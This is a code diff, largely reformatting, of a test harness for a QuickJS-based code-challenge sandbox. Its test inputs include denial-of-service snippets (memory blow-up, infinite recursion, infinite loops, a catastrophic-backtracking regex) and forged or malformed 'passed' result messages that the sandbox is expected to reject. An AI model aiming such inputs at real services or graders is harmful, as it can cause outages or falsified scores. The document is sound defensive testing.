-    const expensiveHardKillResponse = await requestHardDeadlineProbe(page, runMessage(
-      expensiveSource, challengeInputs.slice(0, 1), 'expensive-regexp-hard-kill', 26), 7000);
+    const memoryResponse = await requestRun(
+      page,
+      runMessage(
+        'export function longestWindow(events: string[], k: number): { start: number; endExclusive: number } { const large = new Array(100000000).fill(1); return { start: large.length, endExclusive: large.length }; }',
+        challengeInputs.slice(0, 1),
+        'memory',
+        17,
+      ),
+      7000,
+    );
+    const stackResponse = await requestRun(
+      page,
+      runMessage(
+        'export function longestWindow(events: string[], k: number): { start: number; endExclusive: number } { function recurse(): number { return 1 + recurse(); } const value = recurse(); return { start: value, endExclusive: value }; }',
+        challengeInputs.slice(0, 1),
+        'stack',
+        18,
+      ),
+      7000,
+    );
+    const outputResponse = await requestRun(
+      page,
+      runMessage(
+        'export function longestWindow(events: string[], k: number) { const huge = "x".repeat(100000); return { start: huge, endExclusive: huge }; }',
+        challengeInputs.slice(0, 1),
+        'output',
+        19,
+      ),
+      7000,
+    );
+    const expensiveSource =
+      'export function longestWindow(events: string[], k: number): { start: number; endExclusive: number } { const text = "a".repeat(50000) + "!"; const matched = /(a+)+$/.test(text); return { start: matched ? 1 : 0, endExclusive: 0 }; }';
+    const expensiveResponse = await requestRun(
+      page,
+      runMessage(expensiveSource, challengeInputs.slice(0, 1), 'expensive-regexp-interrupt', 20),
+      7000,
+    );
+    const expensiveHardKillResponse = await requestHardDeadlineProbe(
+      page,
+      runMessage(expensiveSource, challengeInputs.slice(0, 1), 'expensive-regexp-hard-kill', 26),
+      7000,
+    );
 
     const crashRequest = runMessage(
       'export function longestWindow(events: string[], k: number): { start: number; endExclusive: number } { while (true) {} return { start: 0, endExclusive: 0 }; }',
-      challengeInputs.slice(0, 1), 'worker-error', 21);
+      challengeInputs.slice(0, 1),
+      'worker-error',
+      21,
+    );
     const crashBefore = await page.evaluate(() => window.__messages.length);
-    await page.evaluate((message) => window.__activeFrame.contentWindow.postMessage(message, window.__runnerOrigin), crashRequest);
+    await page.evaluate(
+      (message) => window.__activeFrame.contentWindow.postMessage(message, window.__runnerOrigin),
+      crashRequest,
+    );
     await delay(80);
-    await page.evaluate((message) => window.__activeFrame.contentWindow.postMessage({
-      kind: 'test-worker-error', nonce: message.nonce, runId: message.runId,
-    }, window.__runnerOrigin), crashRequest);
-    await page.waitForFunction(({ beforeIndex, nonce }) => window.__messages.slice(beforeIndex).some((entry) =>
-      entry.data?.kind === 'run-result' && entry.data?.nonce === nonce), { beforeIndex: crashBefore, nonce: crashRequest.nonce }, { timeout: 3000 });
-    const crashResponse = await page.evaluate(({ beforeIndex, nonce }) => window.__messages.slice(beforeIndex).find((entry) =>
-      entry.data?.kind === 'run-result' && entry.data?.nonce === nonce), { beforeIndex: crashBefore, nonce: crashRequest.nonce });
+    await page.evaluate(
+      (message) =>
+        window.__activeFrame.contentWindow.postMessage(
+          {
+            kind: 'test-worker-error',
+            nonce: message.nonce,
+            runId: message.runId,
+          },
+          window.__runnerOrigin,
+        ),
+      crashRequest,
+    );
+    await page.waitForFunction(
+      ({ beforeIndex, nonce }) =>
+        window.__messages
+          .slice(beforeIndex)
+          .some((entry) => entry.data?.kind === 'run-result' && entry.data?.nonce === nonce),
+      { beforeIndex: crashBefore, nonce: crashRequest.nonce },
+      { timeout: 3000 },
+    );
+    const crashResponse = await page.evaluate(
+      ({ beforeIndex, nonce }) =>
+        window.__messages
+          .slice(beforeIndex)
+          .find((entry) => entry.data?.kind === 'run-result' && entry.data?.nonce === nonce),
+      { beforeIndex: crashBefore, nonce: crashRequest.nonce },
+    );
 
     const cancellationNonce = `quickjs-fixture-nonce-cancel-${Date.now()}`;
     const cancellationRequest = runMessage(
       'export function longestWindow(events: string[], k: number): { start: number; endExclusive: number } { while (true) {} return { start: 0, endExclusive: 0 }; }',
-      challengeInputs.slice(0, 1), 'cancel', 22);
+      challengeInputs.slice(0, 1),
+      'cancel',
+      22,
+    );
     cancellationRequest.nonce = cancellationNonce;
     const cancelBefore = await page.evaluate(() => window.__messages.length);
     await page.evaluate((message) => {
@@ -834,32 +1125,66 @@ export async function runQuickJsFeasibility() {
     await delay(80);
     const cancellationInitiated = await page.evaluate((message) => {
       if (typeof window.__cancelPendingRun === 'function') return window.__cancelPendingRun(message.nonce);
-      window.__activeFrame.contentWindow.postMessage({
-        protocol: 1, kind: 'cancel', nonce: message.nonce, runId: message.runId, sourceRevision: message.sourceRevision,
-      }, window.__runnerOrigin);
+      window.__activeFrame.contentWindow.postMessage(
+        {
+          protocol: 1,
+          kind: 'cancel',
+          nonce: message.nonce,
+          runId: message.runId,
+          sourceRevision: message.sourceRevision,
+        },
+        window.__runnerOrigin,
+      );
       return false;
     }, cancellationRequest);
-    await page.waitForFunction(({ beforeIndex, nonce }) => window.__messages.slice(beforeIndex).some((entry) =>
-      entry.data?.kind === 'run-result' && entry.data?.nonce === nonce), { beforeIndex: cancelBefore, nonce: cancellationNonce }, { timeout: 3000 });
-    const cancelResponse = await page.evaluate(({ beforeIndex, nonce }) => window.__messages.slice(beforeIndex).find((entry) =>
-      entry.data?.kind === 'run-result' && entry.data?.nonce === nonce), { beforeIndex: cancelBefore, nonce: cancellationNonce });
-    const cancellationReplyAccepted = await page.evaluate((nonce) =>
-      window.__acceptedResults.some((entry) => entry.data?.nonce === nonce), cancellationNonce);
+    await page.waitForFunction(
+      ({ beforeIndex, nonce }) =>
+        window.__messages
+          .slice(beforeIndex)
+          .some((entry) => entry.data?.kind === 'run-result' && entry.data?.nonce === nonce),
+      { beforeIndex: cancelBefore, nonce: cancellationNonce },
+      { timeout: 3000 },
+    );
+    const cancelResponse = await page.evaluate(
+      ({ beforeIndex, nonce }) =>
+        window.__messages
+          .slice(beforeIndex)
+          .find((entry) => entry.data?.kind === 'run-result' && entry.data?.nonce === nonce),
+      { beforeIndex: cancelBefore, nonce: cancellationNonce },
+    );
+    const cancellationReplyAccepted = await page.evaluate(
+      (nonce) => window.__acceptedResults.some((entry) => entry.data?.nonce === nonce),
+      cancellationNonce,
+    );
     const firstWorkerId = workerEvidence?.workerId;
-    const repeatResponse = await requestRun(page, runMessage(challenge.source, challengeInputs.slice(0, 1), 'repeat', 23));
+    const repeatResponse = await requestRun(
+      page,
+      runMessage(challenge.source, challengeInputs.slice(0, 1), 'repeat', 23),
+    );
     const beforeBurstInspection = await inspectFrame(page, 'runner-before-burst');
     const beforeBurstWorkerCount = beforeBurstInspection?.evidence?.runnerMetrics?.workersCreated ?? 0;
-    const burstSource = 'export function longestWindow(events: string[], k: number): { start: number; endExclusive: number } { while (true) {} return { start: 0, endExclusive: 0 }; }';
-    const concurrentResponses = await Promise.all(Array.from({ length: 8 }, (_, index) =>
-      requestHardDeadlineProbe(page, runMessage(burstSource, challengeInputs.slice(0, 1), 'concurrent-' + index, 24 + index))));
+    const burstSource =
+      'export function longestWindow(events: string[], k: number): { start: number; endExclusive: number } { while (true) {} return { start: 0, endExclusive: 0 }; }';
+    const concurrentResponses = await Promise.all(
+      Array.from({ length: 8 }, (_, index) =>
+        requestHardDeadlineProbe(
+          page,
+          runMessage(burstSource, challengeInputs.slice(0, 1), 'concurrent-' + index, 24 + index),
+        ),
+      ),
+    );
     const afterBurstInspection = await inspectFrame(page, 'runner-after-burst');
     const burstMetrics = afterBurstInspection?.evidence?.runnerMetrics ?? {};
     const burstWorkersCreated = burstMetrics.workersCreated - beforeBurstWorkerCount;
-    const burstBusyRejections = concurrentResponses.filter((entry) => entry.data.result.reason === 'policy-rejected').length;
-    const burstWorkersDisposed = burstMetrics.activeWorkers === 0
-      && burstMetrics.workersCreated === burstMetrics.workersTerminated;
-    const burstRecoveryResponse = await requestRun(page, runMessage(
-      challenge.source, challengeInputs.slice(0, 1), 'burst-recovery', 32));
+    const burstBusyRejections = concurrentResponses.filter(
+      (entry) => entry.data.result.reason === 'policy-rejected',
+    ).length;
+    const burstWorkersDisposed =
+      burstMetrics.activeWorkers === 0 && burstMetrics.workersCreated === burstMetrics.workersTerminated;
+    const burstRecoveryResponse = await requestRun(
+      page,
+      runMessage(challenge.source, challengeInputs.slice(0, 1), 'burst-recovery', 32),
+    );
     const finalInspection = await inspectFrame(page, 'runner-final-inspection');
     const metrics = finalInspection?.evidence?.runnerMetrics ?? {};
 
@@ -875,20 +1200,23 @@ export async function runQuickJsFeasibility() {
       typeMismatchDiagnostics: typeMismatchResponse.data.result.diagnostics,
       syntaxErrorRejected: syntaxErrorResponse.data.result.status === 'compile-error',
       importRejected: importResponse.data.result.reason === 'policy-rejected',
-      runtimeErrorDistinguished: runtimeErrorResponse.data.result.status === 'execution-error'
-        && runtimeErrorResponse.data.result.reason === 'runtime-error',
+      runtimeErrorDistinguished:
+        runtimeErrorResponse.data.result.status === 'execution-error' &&
+        runtimeErrorResponse.data.result.reason === 'runtime-error',
       runtimeErrorStatus: runtimeErrorResponse.data.result.status,
       runtimeErrorDiagnostics: runtimeErrorResponse.data.result.diagnostics,
     };
     const q2 = {
-      workerOnlyQuickJs: canonicalPassed && workerEvidence?.quickjsVersion === packageJson.dependencies['quickjs-emscripten'],
+      workerOnlyQuickJs:
+        canonicalPassed && workerEvidence?.quickjsVersion === packageJson.dependencies['quickjs-emscripten'],
       hostBrowserApisUnavailable: hostApiResponse.data.result.cases[0]?.actual?.endExclusive === 0,
-      expectedValuesExcludedFromVm: workerEvidence?.hasExpectedValues === false
-        && workerEvidence?.workerPayloadKeys?.includes('cases') === true,
+      expectedValuesExcludedFromVm:
+        workerEvidence?.hasExpectedValues === false && workerEvidence?.workerPayloadKeys?.includes('cases') === true,
       workerPayloadKeys: workerEvidence?.workerPayloadKeys ?? [],
       hasExpectedValues: workerEvidence?.hasExpectedValues,
-      crossCaseStateReset: stateResponse.data.result.cases.length === 2
-        && stateResponse.data.result.cases.every((item) => item.status === 'passed'),
+      crossCaseStateReset:
+        stateResponse.data.result.cases.length === 2 &&
+        stateResponse.data.result.cases.every((item) => item.status === 'passed'),
     };
     const q3 = {
       loopTimedOut: loopResponse.data.result.status === 'timeout',
@@ -901,7 +1229,9 @@ export async function runQuickJsFeasibility() {
       stackCapped: stackResponse.data.result.status === 'execution-error',
       stackResult: stackResponse.data.result.status,
       stackDiagnostics: stackResponse.data.result.diagnostics,
-      outputCapped: outputResponse.data.result.status === 'execution-error' && outputResponse.data.result.reason === 'policy-rejected',
+      outputCapped:
+        outputResponse.data.result.status === 'execution-error' &&
+        outputResponse.data.result.reason === 'policy-rejected',
       outputResult: outputResponse.data.result.status,
       outputDiagnostics: outputResponse.data.result.diagnostics,
       sourceCapped: sourceLimitResponse.data.result.reason === 'policy-rejected',
@@ -909,21 +1239,26 @@ export async function runQuickJsFeasibility() {
       caseCountCapped: caseLimitResponse.data.result.reason === 'policy-rejected',
       expensiveBuiltinVmInterruptResult: expensiveResponse.data.result.status,
       expensiveBuiltinVmInterruptDiagnostics: expensiveResponse.data.result.diagnostics,
-      expensiveBuiltinHardTerminated: expensiveHardKillResponse.data.testEvidence.termination === 'supervisor-deadline'
-        && expensiveHardKillResponse.data.result.status === 'timeout',
+      expensiveBuiltinHardTerminated:
+        expensiveHardKillResponse.data.testEvidence.termination === 'supervisor-deadline' &&
+        expensiveHardKillResponse.data.result.status === 'timeout',
       expensiveBuiltinHardTerminationResult: expensiveHardKillResponse.data.result.status,
       expensiveBuiltinHardTerminationEvidence: expensiveHardKillResponse.data.testEvidence,
       workerFailureDisposed: crashResponse.data.result.status === 'infrastructure-error',
-      cancelledWorkerDisposed: cancelResponse.data.result.reason === 'cancelled'
-        && metrics.activeWorkers === 0 && metrics.workersTerminated === metrics.workersCreated,
+      cancelledWorkerDisposed:
+        cancelResponse.data.result.reason === 'cancelled' &&
+        metrics.activeWorkers === 0 &&
+        metrics.workersTerminated === metrics.workersCreated,
       cancellationInitiated,
       cancellationReplyAccepted,
-      repeatedRunsUseFreshWorkers: repeatResponse.data.testEvidence.workerId !== firstWorkerId
-        && metrics.workersCreated === metrics.workersTerminated,
-      singleActiveWorkerBurstBounded: metrics.maxActiveWorkers === 1
-        && burstMetrics.maxActiveWorkers === 1
-        && concurrentResponses.length === 8
-        && burstBusyRejections > 0,
+      repeatedRunsUseFreshWorkers:
+        repeatResponse.data.testEvidence.workerId !== firstWorkerId &&
+        metrics.workersCreated === metrics.workersTerminated,
+      singleActiveWorkerBurstBounded:
+        metrics.maxActiveWorkers === 1 &&
+        burstMetrics.maxActiveWorkers === 1 &&
+        concurrentResponses.length === 8 &&
+        burstBusyRejections > 0,
       burstWorkersCreated,
       burstBusyRejections,
       burstResponseStatuses: concurrentResponses.map((entry) => ({
@@ -932,8 +1267,10 @@ export async function runQuickJsFeasibility() {
         termination: entry.data.testEvidence?.termination ?? null,
       })),
       workersDisposedAfterBurst: burstWorkersDisposed,
-      boundedRecoveryAfterBurst: burstRecoveryResponse.data.result.status === 'passed'
-        && metrics.activeWorkers === 0 && metrics.workersCreated === metrics.workersTerminated,
+      boundedRecoveryAfterBurst:
+        burstRecoveryResponse.data.result.status === 'passed' &&
+        metrics.activeWorkers === 0 &&
+        metrics.workersCreated === metrics.workersTerminated,
       limits: { ...BASE_LIMITS },
       workerMetrics: metrics,
     };
@@ -942,53 +1279,169 @@ export async function runQuickJsFeasibility() {
     const inspectRunner = isolation?.evidence ?? {};
     const forgedNonce = 'forged-pass-nonce';
     const forgedBefore = await page.evaluate(() => window.__messages.length);
-    await page.evaluate(({ nonce, revision }) => {
-      const frame = window.__activeFrame;
-      frame.contentWindow.postMessage({ kind: 'test-parent-message', message: {
-        protocol: 1, kind: 'run-result', nonce, sourceRevision: revision,
-        result: { contractVersion: '1.0.0', runId: 'fake', challengeId: 'longest-window', challengeVersion: '1.0.0', sourceRevision: revision, status: 'passed', cases: [], diagnostics: [] },
-      } }, window.__runnerOrigin);
-    }, { nonce: forgedNonce, revision: 20 });
-    await page.waitForFunction((beforeIndex) => window.__messages.length > beforeIndex, forgedBefore, { timeout: 2000 });
-    const forged = await page.evaluate((beforeIndex) => window.__messages.slice(beforeIndex).find((entry) => entry.data?.kind === 'run-result'), forgedBefore);
-    const staleRevision = 'quickjs-fixture-nonce-stale-revision';
-    await page.evaluate((nonce) => { window.__pendingRuns[nonce] = { runId: 'quickjs-fixture-stale-revision', sourceRevision: 8 }; }, staleRevision);
-    const staleBefore = await page.evaluate(() => window.__messages.length);
-    await page.evaluate(({ nonce }) => window.__activeFrame.contentWindow.postMessage({
-      kind: 'test-parent-message', message: {
-        protocol: 1, kind: 'run-result', nonce, sourceRevision: 7,
-        result: { contractVersion: '1.0.0', runId: 'quickjs-fixture-stale-revision', challengeId: 'longest-window', challengeVersion: '1.0.0', sourceRevision: 7, status: 'passed', cases: [], diagnostics: [] },
+    await page.evaluate(
+      ({ nonce, revision }) => {
+        const frame = window.__activeFrame;
+        frame.contentWindow.postMessage(
+          {
+            kind: 'test-parent-message',
+            message: {
+              protocol: 1,
+              kind: 'run-result',
+              nonce,
+              sourceRevision: revision,
+              result: {
+                contractVersion: '1.0.0',
+                runId: 'fake',
+                challengeId: 'longest-window',
+                challengeVersion: '1.0.0',
+                sourceRevision: revision,
+                status: 'passed',
+                cases: [],
+                diagnostics: [],
+              },
+            },
+          },
+          window.__runnerOrigin,
+        );
       },
-    }, window.__runnerOrigin), { nonce: staleRevision });
+      { nonce: forgedNonce, revision: 20 },
+    );
+    await page.waitForFunction((beforeIndex) => window.__messages.length > beforeIndex, forgedBefore, {
+      timeout: 2000,
+    });
+    const forged = await page.evaluate(
+      (beforeIndex) => window.__messages.slice(beforeIndex).find((entry) => entry.data?.kind === 'run-result'),
+      forgedBefore,
+    );
+    const staleRevision = 'quickjs-fixture-nonce-stale-revision';
+    await page.evaluate((nonce) => {
+      window.__pendingRuns[nonce] = { runId: 'quickjs-fixture-stale-revision', sourceRevision: 8 };
+    }, staleRevision);
+    const staleBefore = await page.evaluate(() => window.__messages.length);
+    await page.evaluate(
+      ({ nonce }) =>
+        window.__activeFrame.contentWindow.postMessage(
+          {
+            kind: 'test-parent-message',
+            message: {
+              protocol: 1,
+              kind: 'run-result',
+              nonce,
+              sourceRevision: 7,
+              result: {
+                contractVersion: '1.0.0',
+                runId: 'quickjs-fixture-stale-revision',
+                challengeId: 'longest-window',
+                challengeVersion: '1.0.0',
+                sourceRevision: 7,
+                status: 'passed',
+                cases: [],
+                diagnostics: [],
+              },
+            },
+          },
+          window.__runnerOrigin,
+        ),
+      { nonce: staleRevision },
+    );
     await page.waitForFunction((beforeIndex) => window.__messages.length > beforeIndex, staleBefore, { timeout: 2000 });
-    const staleOutcome = await page.evaluate(({ beforeIndex, nonce }) => ({
-      entry: window.__messages.slice(beforeIndex).find((item) => item.data?.kind === 'run-result' && item.data?.nonce === nonce),
-      accepted: window.__acceptedResults.some((item) => item.data?.nonce === nonce),
-      trustedScore: window.__trustedScore,
-    }), { beforeIndex: staleBefore, nonce: staleRevision });
+    const staleOutcome = await page.evaluate(
+      ({ beforeIndex, nonce }) => ({
+        entry: window.__messages
+          .slice(beforeIndex)
+          .find((item) => item.data?.kind === 'run-result' && item.data?.nonce === nonce),
+        accepted: window.__acceptedResults.some((item) => item.data?.nonce === nonce),
+        trustedScore: window.__trustedScore,
+      }),
+      { beforeIndex: staleBefore, nonce: staleRevision },
+    );
 
     const activeResultChecks = {};
     const malformedResultCases = [
-      ['malformed', (envelope) => { envelope.result.cases = [null]; }],
-      ['empty', (envelope) => { envelope.result.cases = []; }],
-      ['partial', (envelope) => { envelope.result.cases = envelope.result.cases.slice(0, 1); }],
-      ['duplicate', (envelope) => { envelope.result.cases[1] = { ...envelope.result.cases[0] }; }],
-      ['oversized-suite', (envelope) => {
-        envelope.result.cases = Array.from({ length: 101 }, (_, index) => ({
-          caseId: 'oversized-' + index,
-          status: 'passed',
-          expected: { start: 0, endExclusive: 0 },
-          actual: { start: 0, endExclusive: 0 },
-        }));
-      }],
-      ['oversized-payload', (envelope) => { envelope.result.diagnostics = ['x'.repeat(70 * 1024)]; }],
-      ['wrong-protocol', (envelope) => { envelope.protocol = 2; }],
-      ['wrong-contract', (envelope) => { envelope.result.contractVersion = '9.9.9'; }],
-      ['wrong-challenge', (envelope) => { envelope.result.challengeId = 'another-challenge'; }],
-      ['wrong-challenge-version', (envelope) => { envelope.result.challengeVersion = '9.9.9'; }],
-      ['wrong-expected', (envelope) => { envelope.result.cases[0].expected = { start: 90, endExclusive: 91 }; }],
-      ['wrong-actual', (envelope) => { envelope.result.cases[0].actual = { start: 90, endExclusive: 91 }; }],
-      ['non-json', (envelope) => { envelope.result.cases[0].actual.start = Number.POSITIVE_INFINITY; }],
+      [
+        'malformed',
+        (envelope) => {
+          envelope.result.cases = [null];
+        },
+      ],
+      [
+        'empty',
+        (envelope) => {
+          envelope.result.cases = [];
+        },
+      ],
+      [
+        'partial',
+        (envelope) => {
+          envelope.result.cases = envelope.result.cases.slice(0, 1);
+        },
+      ],
+      [
+        'duplicate',
+        (envelope) => {
+          envelope.result.cases[1] = { ...envelope.result.cases[0] };
+        },
+      ],
+      [
+        'oversized-suite',
+        (envelope) => {
+          envelope.result.cases = Array.from({ length: 101 }, (_, index) => ({
+            caseId: 'oversized-' + index,
+            status: 'passed',
+            expected: { start: 0, endExclusive: 0 },
+            actual: { start: 0, endExclusive: 0 },
+          }));
+        },
+      ],
+      [
+        'oversized-payload',
+        (envelope) => {
+          envelope.result.diagnostics = ['x'.repeat(70 * 1024)];
+        },
+      ],
+      [
+        'wrong-protocol',
+        (envelope) => {
+          envelope.protocol = 2;
+        },
+      ],
+      [
+        'wrong-contract',
+        (envelope) => {
+          envelope.result.contractVersion = '9.9.9';
+        },
+      ],
+      [
+        'wrong-challenge',
+        (envelope) => {
+          envelope.result.challengeId = 'another-challenge';
+        },
+      ],
+      [
+        'wrong-challenge-version',
+        (envelope) => {
+          envelope.result.challengeVersion = '9.9.9';
+        },
+      ],
+      [
+        'wrong-expected',
+        (envelope) => {
+          envelope.result.cases[0].expected = { start: 90, endExclusive: 91 };
+        },
+      ],
+      [
+        'wrong-actual',
+        (envelope) => {
+          envelope.result.cases[0].actual = { start: 90, endExclusive: 91 };
+        },
+      ],
+      [
+        'non-json',
+        (envelope) => {
+          envelope.result.cases[0].actual.start = Number.POSITIVE_INFINITY;
+        },
+      ],
     ];
     for (const [name, mutate] of malformedResultCases) {
       const nonce = 'm3-active-' + name;
@@ -999,11 +1452,9 @@ export async function runQuickJsFeasibility() {
 
     for (const sparseArray of ['cases', 'diagnostics']) {
       const nonce = 'm3-active-sparse-' + sparseArray;
-      activeResultChecks['sparse-' + sparseArray] = await injectActiveResult(
-        page,
-        activeResultEnvelope(nonce),
-        { sparseArray },
-      );
+      activeResultChecks['sparse-' + sparseArray] = await injectActiveResult(page, activeResultEnvelope(nonce), {
+        sparseArray,
+      });
     }
 
     const sparseNestedNonce = 'm3-active-sparse-nested-json';
@@ -1012,11 +1463,10 @@ export async function runQuickJsFeasibility() {
     const sparseNestedEnvelope = activeResultEnvelope(sparseNestedNonce);
     sparseNestedEnvelope.result.cases[0].expected = [1, 2, 3];
     sparseNestedEnvelope.result.cases[0].actual = [1, 2, 3];
-    activeResultChecks['sparse-nested-json'] = await injectActiveResult(
-      page,
-      sparseNestedEnvelope,
-      { pending: sparseNestedPending, sparseArray: 'nested-actual' },
-    );
+    activeResultChecks['sparse-nested-json'] = await injectActiveResult(page, sparseNestedEnvelope, {
+      pending: sparseNestedPending,
+      sparseArray: 'nested-actual',
+    });
 
     const replayNonce = 'm3-active-replay';
     const replayEnvelope = activeResultEnvelope(replayNonce);
@@ -1024,7 +1474,9 @@ export async function runQuickJsFeasibility() {
     const replayAgain = await injectActiveResult(page, replayEnvelope, { register: false });
 
     const originalHandshake = await page.evaluate(() => window.__runnerHandshake ?? null);
-    await page.evaluate(() => { window.__runnerHandshake = null; });
+    await page.evaluate(() => {
+      window.__runnerHandshake = null;
+    });
     const missingHandshake = await injectActiveResult(page, activeResultEnvelope('m3-missing-handshake'));
 
     await page.evaluate(() => {
@@ -1042,42 +1494,63 @@ export async function runQuickJsFeasibility() {
     });
     const invalidHandshake = await injectActiveResult(page, activeResultEnvelope('m3-invalid-handshake'));
     const invalidHandshakeCompleted = await page.evaluate(() => window.__runnerHandshake?.complete === true);
-    await page.evaluate((handshake) => { window.__runnerHandshake = handshake; }, originalHandshake);
+    await page.evaluate((handshake) => {
+      window.__runnerHandshake = handshake;
+    }, originalHandshake);
 
-    const cancellationPendingRetired = await page.evaluate((nonce) => !Object.hasOwn(window.__pendingRuns, nonce), cancellationNonce);
+    const cancellationPendingRetired = await page.evaluate(
+      (nonce) => !Object.hasOwn(window.__pendingRuns, nonce),
+      cancellationNonce,
+    );
 
     const q4 = {
       foreignOriginRejected,
       wrongSourceRejected,
-      forgedPassRejected: forged?.sourceMatches === true
-        && !(await page.evaluate((nonce) => window.__acceptedResults.some((entry) => entry.data?.nonce === nonce), forgedNonce))
-        && staleOutcome.trustedScore === null,
+      forgedPassRejected:
+        forged?.sourceMatches === true &&
+        !(await page.evaluate(
+          (nonce) => window.__acceptedResults.some((entry) => entry.data?.nonce === nonce),
+          forgedNonce,
+        )) &&
+        staleOutcome.trustedScore === null,
       staleRevisionRejected: staleOutcome.entry?.data?.result?.sourceRevision === 7 && !staleOutcome.accepted,
-      validHandshakeEstablished: runnerEnv.handshakeCompleted === true
-        && runnerEnv.handshakeAckMessage?.origin === state.runnerOrigin
-        && runnerEnv.handshakeAckMessage?.sourceMatches === true
-        && runnerEnv.handshakeAckMessage?.data?.protocol === 1
-        && runnerEnv.handshakeAckMessage?.data?.nonce === runnerEnv.handshakeState?.nonce,
-      activeMalformedCaseRejected: !activeResultChecks.malformed.accepted
-        && activeResultChecks.malformed.infrastructureError && activeResultChecks.malformed.pendingRetired,
-      activeEmptySuiteRejected: !activeResultChecks.empty.accepted
-        && activeResultChecks.empty.infrastructureError && activeResultChecks.empty.pendingRetired,
-      activePartialSuiteRejected: !activeResultChecks.partial.accepted
-        && activeResultChecks.partial.infrastructureError && activeResultChecks.partial.pendingRetired,
-      activeDuplicateSuiteRejected: !activeResultChecks.duplicate.accepted
-        && activeResultChecks.duplicate.infrastructureError && activeResultChecks.duplicate.pendingRetired,
-      activeSparseCasesRejected: !activeResultChecks['sparse-cases'].accepted
-        && activeResultChecks['sparse-cases'].infrastructureError
-        && activeResultChecks['sparse-cases'].pendingRetired
-        && activeResultChecks['sparse-cases'].sparseHolePreserved,
-      activeSparseDiagnosticsRejected: !activeResultChecks['sparse-diagnostics'].accepted
-        && activeResultChecks['sparse-diagnostics'].infrastructureError
-        && activeResultChecks['sparse-diagnostics'].pendingRetired
-        && activeResultChecks['sparse-diagnostics'].sparseHolePreserved,
-      activeSparseNestedJsonRejected: !activeResultChecks['sparse-nested-json'].accepted
-        && activeResultChecks['sparse-nested-json'].infrastructureError
-        && activeResultChecks['sparse-nested-json'].pendingRetired
-        && activeResultChecks['sparse-nested-json'].sparseHolePreserved,
+      validHandshakeEstablished:
+        runnerEnv.handshakeCompleted === true &&
+        runnerEnv.handshakeAckMessage?.origin === state.runnerOrigin &&
+        runnerEnv.handshakeAckMessage?.sourceMatches === true &&
+        runnerEnv.handshakeAckMessage?.data?.protocol === 1 &&
+        runnerEnv.handshakeAckMessage?.data?.nonce === runnerEnv.handshakeState?.nonce,
+      activeMalformedCaseRejected:
+        !activeResultChecks.malformed.accepted &&
+        activeResultChecks.malformed.infrastructureError &&
+        activeResultChecks.malformed.pendingRetired,
+      activeEmptySuiteRejected:
+        !activeResultChecks.empty.accepted &&
+        activeResultChecks.empty.infrastructureError &&
+        activeResultChecks.empty.pendingRetired,
+      activePartialSuiteRejected:
+        !activeResultChecks.partial.accepted &&
+        activeResultChecks.partial.infrastructureError &&
+        activeResultChecks.partial.pendingRetired,
+      activeDuplicateSuiteRejected:
+        !activeResultChecks.duplicate.accepted &&
+        activeResultChecks.duplicate.infrastructureError &&
+        activeResultChecks.duplicate.pendingRetired,
+      activeSparseCasesRejected:
+        !activeResultChecks['sparse-cases'].accepted &&
+        activeResultChecks['sparse-cases'].infrastructureError &&
+        activeResultChecks['sparse-cases'].pendingRetired &&
+        activeResultChecks['sparse-cases'].sparseHolePreserved,
+      activeSparseDiagnosticsRejected:
+        !activeResultChecks['sparse-diagnostics'].accepted &&
+        activeResultChecks['sparse-diagnostics'].infrastructureError &&
+        activeResultChecks['sparse-diagnostics'].pendingRetired &&
+        activeResultChecks['sparse-diagnostics'].sparseHolePreserved,
+      activeSparseNestedJsonRejected:
+        !activeResultChecks['sparse-nested-json'].accepted &&
+        activeResultChecks['sparse-nested-json'].infrastructureError &&
+        activeResultChecks['sparse-nested-json'].pendingRetired &&
+        activeResultChecks['sparse-nested-json'].sparseHolePreserved,
       activeSparseArrayStructuredCloneEvidence: {
         casesHolePreserved: activeResultChecks['sparse-cases'].sparseHolePreserved,
         casesAccepted: activeResultChecks['sparse-cases'].accepted,
@@ -1086,24 +1559,26 @@ export async function runQuickJsFeasibility() {
         nestedActualHolePreserved: activeResultChecks['sparse-nested-json'].sparseHolePreserved,
         nestedActualAccepted: activeResultChecks['sparse-nested-json'].accepted,
       },
-      activeOversizedSuiteRejected: !activeResultChecks['oversized-suite'].accepted
-        && activeResultChecks['oversized-suite'].infrastructureError,
-      activeOversizedResultRejected: !activeResultChecks['oversized-payload'].accepted
-        && activeResultChecks['oversized-payload'].infrastructureError,
-      activeWrongProtocolRejected: !activeResultChecks['wrong-protocol'].accepted
-        && activeResultChecks['wrong-protocol'].infrastructureError,
-      activeWrongContractVersionRejected: !activeResultChecks['wrong-contract'].accepted
-        && activeResultChecks['wrong-contract'].infrastructureError,
-      activeWrongChallengeRejected: !activeResultChecks['wrong-challenge'].accepted
-        && activeResultChecks['wrong-challenge'].infrastructureError,
-      activeWrongChallengeVersionRejected: !activeResultChecks['wrong-challenge-version'].accepted
-        && activeResultChecks['wrong-challenge-version'].infrastructureError,
-      activeWrongExpectedRejected: !activeResultChecks['wrong-expected'].accepted
-        && activeResultChecks['wrong-expected'].infrastructureError,
-      activeWrongActualRejected: !activeResultChecks['wrong-actual'].accepted
-        && activeResultChecks['wrong-actual'].infrastructureError,
-      activeNonJsonResultRejected: !activeResultChecks['non-json'].accepted
-        && activeResultChecks['non-json'].infrastructureError,
+      activeOversizedSuiteRejected:
+        !activeResultChecks['oversized-suite'].accepted && activeResultChecks['oversized-suite'].infrastructureError,
+      activeOversizedResultRejected:
+        !activeResultChecks['oversized-payload'].accepted &&
+        activeResultChecks['oversized-payload'].infrastructureError,
+      activeWrongProtocolRejected:
+        !activeResultChecks['wrong-protocol'].accepted && activeResultChecks['wrong-protocol'].infrastructureError,
+      activeWrongContractVersionRejected:
+        !activeResultChecks['wrong-contract'].accepted && activeResultChecks['wrong-contract'].infrastructureError,
+      activeWrongChallengeRejected:
+        !activeResultChecks['wrong-challenge'].accepted && activeResultChecks['wrong-challenge'].infrastructureError,
+      activeWrongChallengeVersionRejected:
+        !activeResultChecks['wrong-challenge-version'].accepted &&
+        activeResultChecks['wrong-challenge-version'].infrastructureError,
+      activeWrongExpectedRejected:
+        !activeResultChecks['wrong-expected'].accepted && activeResultChecks['wrong-expected'].infrastructureError,
+      activeWrongActualRejected:
+        !activeResultChecks['wrong-actual'].accepted && activeResultChecks['wrong-actual'].infrastructureError,
+      activeNonJsonResultRejected:
+        !activeResultChecks['non-json'].accepted && activeResultChecks['non-json'].infrastructureError,
       activeReplayRejected: replayFirst.accepted && replayFirst.pendingRetired && !replayAgain.accepted,
       activeReplayEvidence: {
         firstAccepted: replayFirst.accepted,
@@ -1114,30 +1589,42 @@ export async function runQuickJsFeasibility() {
       },
